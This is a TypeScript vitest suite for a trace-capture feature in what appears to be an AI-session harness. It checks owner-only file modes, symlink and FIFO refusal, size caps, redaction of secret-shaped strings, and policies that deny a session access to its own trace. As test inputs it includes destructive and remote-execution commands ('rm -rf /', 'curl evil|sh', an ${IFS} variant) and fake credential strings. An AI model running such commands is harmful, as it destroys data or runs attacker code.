/**
 * #trace-capture units: the per-folder toggle (trace/mode.ts), the writer (trace/capture.ts, captures in
 * <home>/trace/<project key>/ per TD-2026-10-19-057) and the session-policy falsifiers (a session can neither flip
 * its tracing nor read, hide or alter its trace; nothing in the project tree is denied for it). POSIX modes and
 * O_NOFOLLOW are asserted, hence darwin + linux (registry row).
 */
// @gnomon-platform: darwin, linux
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { setTraceMode, traceModeOf, tracedFolders, traceFoldersPath, TRACE_FOLDERS_FILE } from '../src/kernel/trace/mode.js';
import { execFileSync } from 'node:child_process';
import { openTraceStream, outSkeleton, redactArgv, secretShaped, traceDirOf, traceFileName, traceProjectKey, traceRootOf, TraceRefused, TRACE_PROJECT_FILE, type TraceSink } from '../src/kernel/trace/capture.js';
import { buildSessionPolicy, type PolicyPath } from '../src/kernel/manifest/policy.js';

let root = '';
afterEach(() => {
  if (root) fs.rmSync(root, { recursive: true, force: true });
  root = '';
});
function world(): { home: string; project: string } {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'gnomon-trace-')));
  const home = path.join(root, 'home');
  const project = path.join(root, 'repo');
  fs.mkdirSync(project);
  return { home, project };
}
const HSID = 'hsid:v1:01HZZZZZZZZZZZZZZZZZZZZZZZ';
const mode = (p: string): number => fs.lstatSync(p).mode & 0o777;
const lines = (f: string): Array<{ t: string; dir: string; line: unknown }> => fs.readFileSync(f, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l));
const covers = (d: PolicyPath, p: string): boolean => (d.match === 'literal' ? d.path === p : d.match === 'prefix' ? p.startsWith(d.path) : d.match === 'subpath' ? p === d.path || p.startsWith(`${d.path}${path.sep}`) : false);
const settle = (ms = 0): Promise<void> => new Promise((r) => setTimeout(r, ms));

describe('#trace-capture toggle (trace/mode.ts)', () => {
  it('on / off / list, keyed by realpath; the file is 0600 in a 0700 home', () => {
    const { home, project } = world();
    const link = path.join(root, 'link-to-repo');
    fs.symlinkSync(project, link);
    expect(traceModeOf(home, project)).toBe(false);
    setTraceMode(home, link, true);
    expect(traceModeOf(home, project)).toBe(true);
    expect(traceModeOf(home, link)).toBe(true);
    expect(tracedFolders(home)).toEqual([project]);
    expect(mode(traceFoldersPath(home))).toBe(0o600);
    expect(mode(home)).toBe(0o700);
    setTraceMode(home, project, true);
    expect(tracedFolders(home)).toEqual([project]);
    setTraceMode(home, project, false);
    expect(traceModeOf(home, project)).toBe(false);
    expect(tracedFolders(home)).toEqual([]);
    expect(fs.readdirSync(home).filter((f) => f.endsWith('.tmp'))).toEqual([]);
  });
  it('a relative or missing folder throws; an unresolvable folder reads off', () => {
    const { home, project } = world();
    expect(() => setTraceMode(home, 'repo', true)).toThrow(TypeError);
    expect(() => setTraceMode(home, path.join(root, 'nope'), true)).toThrow();
    expect(traceModeOf(home, path.join(root, 'nope'))).toBe(false);
    expect(traceModeOf(home, project)).toBe(false);
  });
  it('a damaged, symlinked or group-readable toggle file reads off (fail closed) and is rewritten by the next set', () => {
    const { home, project } = world();
    setTraceMode(home, project, true);
    fs.chmodSync(traceFoldersPath(home), 0o644);
    expect(traceModeOf(home, project)).toBe(false);
    fs.rmSync(traceFoldersPath(home));
    const elsewhere = path.join(root, 'planted.json');
    fs.writeFileSync(elsewhere, JSON.stringify({ schemaVersion: 'gnomon-trace-folders:v1', folders: [project] }), { mode: 0o600 });
    fs.symlinkSync(elsewhere, traceFoldersPath(home));
    expect(traceModeOf(home, project)).toBe(false);
    fs.rmSync(traceFoldersPath(home));
    fs.writeFileSync(traceFoldersPath(home), '{not json', { mode: 0o600 });
    expect(traceModeOf(home, project)).toBe(false);
    setTraceMode(home, project, true);
    expect(traceModeOf(home, project)).toBe(true);
  });
  it('no project file can switch it on: a toggle file or trace dir inside the project is never read', () => {
    const { home, project } = world();
    fs.mkdirSync(path.join(project, '.gnomon', 'trace'), { recursive: true });
    fs.writeFileSync(path.join(project, '.gnomon', TRACE_FOLDERS_FILE), JSON.stringify({ schemaVersion: 'gnomon-trace-folders:v1', folders: [project] }), { mode: 0o600 });
    fs.writeFileSync(path.join(project, '.gnomon', 'project.yaml'), 'trace: on\n');
    expect(traceModeOf(home, project)).toBe(false);
    expect(tracedFolders(home)).toEqual([]);
  });
});

describe('#trace-capture writer (trace/capture.ts)', () => {
  it('writes <home>/trace/<key>/ (0700) with project.json and a 0600 file named without ":"; NOTHING under the project', async () => {
    const { home, project } = world();
    fs.writeFileSync(path.join(project, '.gitignore'), 'node_modules\n');
    const before = fs.readdirSync(project);
    const t = openTraceStream(home, project, HSID);
    expect(path.basename(t.file)).toBe('hsid-v1-01HZZZZZZZZZZZZZZZZZZZZZZZ.jsonl');
    expect(traceFileName(HSID)).not.toContain(':');
    expect(path.dirname(t.file)).toBe(traceDirOf(home, project));
    expect(path.dirname(path.dirname(t.file))).toBe(traceRootOf(home));
    t.in('{"type":"user","message":{"role":"user","content":[{"type":"text","text":"hi"}]}}\n');
    t.out('{"type":"system","subtype":"init"}');
    t.out('not json');
    t.ctl({ event: 'exit', code: 0, signal: null });
    await t.close();
    expect(mode(traceRootOf(home))).toBe(0o700);
    expect(mode(traceDirOf(home, project))).toBe(0o700);
    expect(mode(t.file)).toBe(0o600);
    const pj = path.join(traceDirOf(home, project), TRACE_PROJECT_FILE);
    expect(mode(pj)).toBe(0o600);
    expect(JSON.parse(fs.readFileSync(pj, 'utf8'))).toEqual({ schemaVersion: 'gnomon-trace-project:v1', realpath: project });
    // FALSIFIER (TD-2026-10-19-057): nothing is written into the project tree
    expect(fs.readdirSync(project)).toEqual(before);
    expect(fs.readFileSync(path.join(project, '.gitignore'), 'utf8')).toBe('node_modules\n');
    const got = lines(t.file);
    expect(got.map((l) => l.dir)).toEqual(['in', 'out', 'out', 'ctl']);
    expect(got[0]!.line).toEqual({ type: 'user', message: { role: 'user', content: [{ type: 'text', text: 'hi' }] } });
    expect(got[2]!.line).toBe('not json');
    for (const l of got) expect(l.t).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
    expect(fs.readFileSync(t.file, 'utf8')).not.toContain('\r');
  });
  it('the project key: a readable slug + 12 hex of the realpath hash, filename-safe, distinct per folder', () => {
    expect(traceProjectKey('/Users/x/a-paradigm')).toMatch(/^a-paradigm-[0-9a-f]{12}$/);
    expect(traceProjectKey('/')).toMatch(/^root-[0-9a-f]{12}$/);
    expect(traceProjectKey('/a/Ünïcödé: CON?.')).toMatch(/^[a-z0-9-]+-[0-9a-f]{12}$/);
    expect(traceProjectKey('/a/x'.padEnd(300, 'y'))).toMatch(/^[a-z0-9-]{1,40}-[0-9a-f]{12}$/);
    expect(traceProjectKey('/a/repo')).not.toBe(traceProjectKey('/b/repo'));
    for (const k of [traceProjectKey('C:\\Users\\x\\repo'), traceProjectKey('/a/b:c')]) expect(k).not.toMatch(/[:\\/]/);
  });
  it('a key dir whose project.json names another folder refuses trace-unsafe (collision or plant)', () => {
    const { home, project } = world();
    const dir = traceDirOf(home, project);
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    fs.chmodSync(home, 0o700);
    fs.chmodSync(traceRootOf(home), 0o700);
    fs.writeFileSync(path.join(dir, TRACE_PROJECT_FILE), JSON.stringify({ schemaVersion: 'gnomon-trace-project:v1', realpath: '/somewhere/else' }), { mode: 0o600 });
    expect(() => openTraceStream(home, project, HSID)).toThrow(expect.objectContaining({ reason: 'trace-unsafe' }));
  });
  it('a resumed session appends; a clean prior close writes no note, an unclean one writes prior-close-unclean', async () => {
    const { home, project } = world();
    const a = openTraceStream(home, project, HSID);
    a.ctl({ event: 'one' });
    a.ctl({ event: 'exit', code: 0, signal: null });
    await a.close();
    const b = openTraceStream(home, project, HSID);
    b.ctl({ event: 'two' }); // no exit: the kernel died
    await b.close();
    const c = openTraceStream(home, project, HSID);
    await c.close();
    expect(lines(a.file).map((l) => (l.line as { event: string }).event)).toEqual(['one', 'exit', 'two', 'prior-close-unclean']);
    // a torn last line: a blank separator first, then the note on its own line
    fs.appendFileSync(a.file, '{"t":"x","dir":"ou');
    const d = openTraceStream(home, project, HSID);
    await d.close();
    const raw = fs.readFileSync(a.file, 'utf8').split('\n');
    expect(JSON.parse(raw.at(-2)!)).toMatchObject({ dir: 'ctl', line: { event: 'prior-close-unclean' } });
  });
  it('a planted symlink file, a linked trace root or key dir, or a dir wider than owner-only refuses trace-unsafe', async () => {
    const { home, project } = world();
    (await openTraceStream(home, project, HSID).close());
    const other = 'hsid:v1:01HYYYYYYYYYYYYYYYYYYYYYYY';
    fs.symlinkSync(path.join(root, 'victim'), path.join(traceDirOf(home, project), traceFileName(other)));
    expect(() => openTraceStream(home, project, other)).toThrow(TraceRefused);
    fs.mkdirSync(path.join(root, 'elsewhere'));
    const p2 = path.join(root, 'repo2');
    fs.mkdirSync(p2);
    fs.symlinkSync(path.join(root, 'elsewhere'), traceDirOf(home, p2));
    expect(() => openTraceStream(home, p2, HSID)).toThrow(expect.objectContaining({ reason: 'trace-unsafe' }));
    const h2 = path.join(root, 'home2');
    fs.mkdirSync(h2, { mode: 0o700 });
    fs.symlinkSync(path.join(root, 'elsewhere'), traceRootOf(h2));
    expect(() => openTraceStream(h2, project, HSID)).toThrow(expect.objectContaining({ reason: 'trace-unsafe' }));
    expect(fs.readdirSync(path.join(root, 'elsewhere'))).toEqual([]);
    const p4 = path.join(root, 'repo4');
    fs.mkdirSync(p4);
    fs.mkdirSync(traceDirOf(home, p4), { mode: 0o755 });
    fs.chmodSync(traceDirOf(home, p4), 0o755);
    expect(() => openTraceStream(home, p4, HSID)).toThrow(expect.objectContaining({ reason: 'trace-unsafe' }));
  });
  it('FALSIFIER (Aegis M3): a FIFO at the trace file is refused at once, without hanging the kernel', () => {
    const { home, project } = world();
    fs.mkdirSync(traceDirOf(home, project), { recursive: true, mode: 0o700 });
    fs.chmodSync(home, 0o700);
    fs.chmodSync(traceRootOf(home), 0o700);
    const fifo = path.join(traceDirOf(home, project), traceFileName(HSID));
    execFileSync('mkfifo', ['-m', '600', fifo]);
    const t0 = performance.now();
    expect(() => openTraceStream(home, project, HSID)).toThrow(expect.objectContaining({ reason: 'trace-unsafe' }));
    expect(performance.now() - t0).toBeLessThan(1000);
    // a FIFO as project.json too
    const p2 = path.join(root, 'repo2');
    fs.mkdirSync(p2);
    fs.mkdirSync(traceDirOf(home, p2), { mode: 0o700 });
    execFileSync('mkfifo', ['-m', '600', path.join(traceDirOf(home, p2), TRACE_PROJECT_FILE)]);
    expect(() => openTraceStream(home, p2, HSID)).toThrow(expect.objectContaining({ reason: 'trace-unsafe' }));
  });
  it('FALSIFIER (Aegis M1): an over-size record keeps a truncated copy, its hash and its full byte length', async () => {
    const { home, project } = world();
    const t = openTraceStream(home, project, HSID, { recordBoundBytes: 2048 });
    const big = JSON.stringify({ type: 'assistant', subtype: 'x', text: `start-${'y'.repeat(10_000)}` });
    t.out(big);
    await t.close();
    const [rec] = lines(t.file) as Array<{ dir: string; line: Record<string, unknown> }>;
    expect(fs.readFileSync(t.file, 'utf8').split('\n')[0]!.length).toBeLessThanOrEqual(2048);
    expect(rec).toMatchObject({ dir: 'out', line: { truncated: 'record-cap', type: 'assistant', subtype: 'x', bytes: Buffer.byteLength(big), hash: expect.stringMatching(/^sha256:[0-9a-f]{64}$/) } });
    expect(String(rec!.line.head)).toMatch(/^\{"type":"assistant","subtype":"x","text":"start-y+/);
    expect(t.stats().truncated).toBe(1);
  });
  it('FALSIFIER (Aegis M1): past the file bound in and ctl records are still recorded, out records as skeletons', async () => {
    const { home, project } = world();
    const t = openTraceStream(home, project, HSID, { fileBoundBytes: 4096 });
    const big = JSON.stringify({ type: 'assistant', message: { content: [{ type: 'text', text: 'x'.repeat(200) }, { type: 'tool_use', id: 'tu_1', name: 'Bash', input: { command: 'rm -rf /' } }] } });
    for (let i = 0; i < 40; i++) t.out(big);
    t.in(JSON.stringify({ type: 'user', message: { content: [{ type: 'text', text: 'after the cap' }] } }));
    t.ctl({ event: 'exit', code: 0, signal: null });
    await t.close();
    const got = lines(t.file) as Array<{ dir: string; line: Record<string, unknown> }>;
    const capAt = got.findIndex((l) => l.dir === 'ctl' && l.line.event === 'capped');
    expect(capAt).toBeGreaterThan(0);
    expect(got[capAt]!.line).toEqual({ event: 'capped', capBytes: 4096, mode: 'skeleton' });
    const after = got.slice(capAt + 1);
    expect(after.filter((l) => l.dir === 'out').length).toBeGreaterThan(0);
    for (const l of after.filter((x) => x.dir === 'out')) expect(l.line).toEqual({ skeleton: true, type: 'assistant', tools: [{ name: 'Bash', id: 'tu_1' }] });
    expect(after.find((l) => l.dir === 'in')!.line).toEqual({ type: 'user', message: { content: [{ type: 'text', text: 'after the cap' }] } });
    expect(after.at(-1)).toMatchObject({ dir: 'ctl', line: { event: 'exit' } });
    expect(JSON.stringify(after)).not.toContain('rm -rf');
    expect(outSkeleton('raw')).toEqual({ skeleton: true });
  });
  it('past the hard bound out records are only counted; in and ctl still land', async () => {
    const { home, project } = world();
    const t = openTraceStream(home, project, HSID, { fileBoundBytes: 2048 });
    for (let i = 0; i < 400; i++) t.out(JSON.stringify({ type: 'assistant', subtype: 'y'.repeat(100), i }));
    t.in(JSON.stringify({ type: 'user', i: 'late' }));
    await t.close();
    const got = lines(t.file) as Array<{ dir: string; line: Record<string, unknown> }>;
    expect(got.find((l) => l.dir === 'in')!.line).toEqual({ type: 'user', i: 'late' });
    expect(got.find((l) => l.dir === 'ctl' && l.line.event === 'out-skipped')!.line.count).toBeGreaterThan(0);
    expect(fs.statSync(t.file).size).toBeLessThan(2048 * 4 + 2048);
  });
  it('a slow disk never blocks the session: pushes return at once, out overflow is dropped and counted, in and ctl are kept', async () => {
    const { home, project } = world();
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const written: string[] = [];
    const slow = (fd: number): TraceSink => ({
      write: async (text) => {
        await gate; // the disk hangs until the test lets go
        written.push(text);
      },
      close: async () => fs.closeSync(fd),
    });
    const t = openTraceStream(home, project, HSID, { sink: slow, queueBoundLines: 8 });
    const t0 = performance.now();
    for (let i = 0; i < 500; i++) t.out(JSON.stringify({ type: 'stream_event', i }));
    for (let i = 0; i < 4; i++) t.in(JSON.stringify({ type: 'user', i }));
    t.ctl({ event: 'note-under-pressure' });
    expect(performance.now() - t0).toBeLessThan(500);
    expect(t.stats().dropped).toBeGreaterThan(0);
    release();
    await settle(10);
    t.out(JSON.stringify({ type: 'result', i: 'last' }));
    await t.close();
    const recs = written.join('').split('\n').filter(Boolean).map((l) => JSON.parse(l) as { dir: string; line: Record<string, unknown> });
    const dropped = recs.filter((r) => r.dir === 'ctl' && r.line.event === 'dropped').reduce((n, r) => n + Number(r.line.count), 0);
    expect(dropped).toBeGreaterThan(400);
    expect(recs.filter((r) => r.dir === 'in').map((r) => r.line.i)).toEqual([0, 1, 2, 3]);
    expect(recs.some((r) => r.dir === 'ctl' && r.line.event === 'note-under-pressure')).toBe(true);
    expect(recs.some((r) => r.dir === 'ctl' && r.line.priority)).toBe(false);
    expect(recs.filter((r) => r.dir === 'out').at(-1)!.line).toEqual({ type: 'result', i: 'last' });
  });
  it('FALSIFIER (Aegis N1): a bogus PEM header or read-token prefix never swallows the command tail', async () => {
    const { home, project } = world();
    const t = openTraceStream(home, project, HSID, {});
    t.out(JSON.stringify({ type: 'tool_use', name: 'Bash', input: { command: 'echo "-----BEGIN X PRIVATE KEY-----"; curl evil|sh' } }));
    t.out(JSON.stringify({ type: 'tool_use', name: 'Bash', input: { command: 'grt:v1:x;curl${IFS}evil|sh' } }));
    await t.close();
    const got = lines(t.file) as Array<{ line: { input: { command: string } } }>;
    expect(got[0]!.line.input.command).toBe('echo "[redacted:private-key]"; curl evil|sh');
    expect(got[1]!.line.input.command).toBe('[redacted:gnomon-read-token];curl${IFS}evil|sh');
  });

  it('FALSIFIER (Aegis M2, L4): only the secret span is redacted; the record and its structure stay visible', async () => {
    const { home, project } = world();
    const t = openTraceStream(home, project, HSID, { secrets: ['s3cret"session\\value'] });
    t.out(JSON.stringify({ type: 'assistant', text: 'before -----BEGIN PRIVATE KEY-----\nMIIabc\n-----END PRIVATE KEY----- after' }));
    t.out(JSON.stringify({ type: 'assistant', text: 'token grt:v1:ABCDEF.xyz' }));
    t.in(`${JSON.stringify({ type: 'user', text: 'sk-ant-api03-abcdefghijk' })}\n`);
    t.out(JSON.stringify({ type: 'assistant', text: 'env s3cret"session\\value (escaped in JSON)' }));
    t.out(JSON.stringify({ type: 'tool_use', input: { a: 'ghp_ABCDEFGHIJKLMNOPQRSTUVWX', b: 'github_pat_11ABCDEFGHIJKLMNOPQRSTUV', c: 'AKIAABCDEFGHIJKLMNOP', d: 'xoxb-1234567890-abc' } }));
    t.out('raw text sk-ant-api03-zzzzzzzzzz tail');
    t.out(JSON.stringify({ type: 'assistant', text: 'fine' }));
    await t.close();
    const text = fs.readFileSync(t.file, 'utf8');
    for (const s of ['PRIVATE KEY', 'grt:v1:', 'sk-ant-', 's3cret', 'ghp_', 'github_pat_', 'AKIA', 'xoxb-']) expect(text).not.toContain(s);
    const got = lines(t.file) as Array<{ dir: string; line: unknown }>;
    expect(got).toHaveLength(8);
    expect(got[0]!.line).toEqual({ type: 'assistant', text: 'before [redacted:private-key] after' });
    expect(got[1]!.line).toEqual({ type: 'assistant', text: 'token [redacted:gnomon-read-token]' });
    expect(got[2]).toMatchObject({ dir: 'in', line: { type: 'user', text: '[redacted:anthropic-key]' } });
    expect(got[3]!.line).toEqual({ type: 'assistant', text: 'env [redacted:secret-value] (escaped in JSON)' });
    expect(got[4]!.line).toEqual({ type: 'tool_use', input: { a: '[redacted:github-token]', b: '[redacted:github-token]', c: '[redacted:aws-key]', d: '[redacted:slack-token]' } });
    expect(got[5]!.line).toBe('raw text [redacted:anthropic-key] tail');
    expect(got.at(-1)).toMatchObject({ dir: 'ctl', line: { event: 'redacted', count: 9 } });
    expect(secretShaped('{"a":"b"}')).toBe(false);
  });
  it('redactArgv hides the system prompt text, keeps the flags', () => {
    expect(redactArgv(['-p', '--append-system-prompt', 'be terse', '--model', 'x', '--append-system-prompt=secret'])).toEqual([
      '-p', '--append-system-prompt', expect.stringMatching(/^<redacted sha256:[0-9a-f]{64} bytes=8>$/), '--model', 'x', '--append-system-prompt=<redacted bytes=6>',
    ]);
  });
});

describe('#trace-capture session-policy falsifiers', () => {
  const policyFor = (home: string, project: string) =>
    buildSessionPolicy({ home, cwd: project, userClaudeDir: path.join(root, 'u', '.claude'), userHome: path.join(root, 'u'), managedSettingsPaths: [], linkedFolders: [], endpointPort: null });
  it('the session cannot flip tracing: the toggle file in the Gnomon home is read- and write-denied', () => {
    const { home, project } = world();
    fs.mkdirSync(home);
    const pol = policyFor(home, project);
    const f = traceFoldersPath(home);
    expect(pol.denyWrite.some((d) => covers(d, f))).toBe(true);
    expect(pol.denyRead.some((d) => covers(d, f))).toBe(true);
    expect(pol.allowRead.some((d) => covers(d, f))).toBe(false);
    expect(pol.allowWrite.some((d) => covers(d, f))).toBe(false);
  });
  it('TD-2026-10-19-057: <home>/trace (the root, a key dir, a capture, project.json) is read- and write-denied, never carved back', () => {
    const { home, project } = world();
    fs.mkdirSync(home);
    const pol = policyFor(home, project);
    const dir = traceDirOf(home, project);
    for (const p of [traceRootOf(home), dir, path.join(dir, traceFileName(HSID)), path.join(dir, TRACE_PROJECT_FILE)]) {
      expect(pol.denyRead.some((d) => covers(d, p)), p).toBe(true);
      expect(pol.denyWrite.some((d) => covers(d, p)), p).toBe(true);
      expect(pol.allowRead.some((d) => covers(d, p)), p).toBe(false);
      expect(pol.allowWrite.some((d) => covers(d, p)), p).toBe(false);
    }
    // the home itself is in the write deny (subpath: the dir too), so neither it nor trace/ can be renamed or swapped
    expect(pol.denyWrite.some((d) => d.match === 'subpath' && d.path === home)).toBe(true);
  });
  it('Aegis L7: nothing in the project tree is denied for the trace (git may create or remove .gnomon; no EPERM noise)', () => {
    const { home, project } = world();
    const pol = policyFor(home, project);
    for (const p of [path.join(project, '.gnomon'), path.join(project, '.gnomon', 'trace'), path.join(project, '.gnomon', 'trace', 'x.jsonl')]) {
      expect(pol.denyWrite.some((d) => covers(d, p)), p).toBe(false);
      expect(pol.denyRead.some((d) => covers(d, p)), p).toBe(false);
      expect(pol.denyReadAlways.some((d) => covers(d, p)), p).toBe(false);
    }
    expect(JSON.stringify(pol)).not.toContain('"trace"');
  });
});
